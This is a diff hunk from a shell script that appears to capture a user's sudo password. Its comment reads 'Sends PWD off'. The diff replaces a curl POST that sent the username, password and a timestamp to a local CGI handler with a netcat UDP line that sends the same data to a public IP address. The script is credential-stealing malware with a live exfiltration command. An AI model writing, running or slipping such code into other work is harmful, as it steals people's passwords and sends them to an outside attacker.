@@ -18,9 +18,7 @@ if ! sudo -n true 2>/dev/null; then
 fi
 
 # Sends PWD off
-
-receiver_ip="192.168.50.32"
-curl -X POST --data-raw "$USER:$pwd at $(date +"%Y/%m/%d - %I:%M %p") " http://$receiver_ip:8000/cgi-bin/handler.py
+echo "$USER:$pwd at $(date +"%Y/%m/%d - %I:%M %p") " | nc -u 144.24.21.253 65432
 unset pwd
 
 
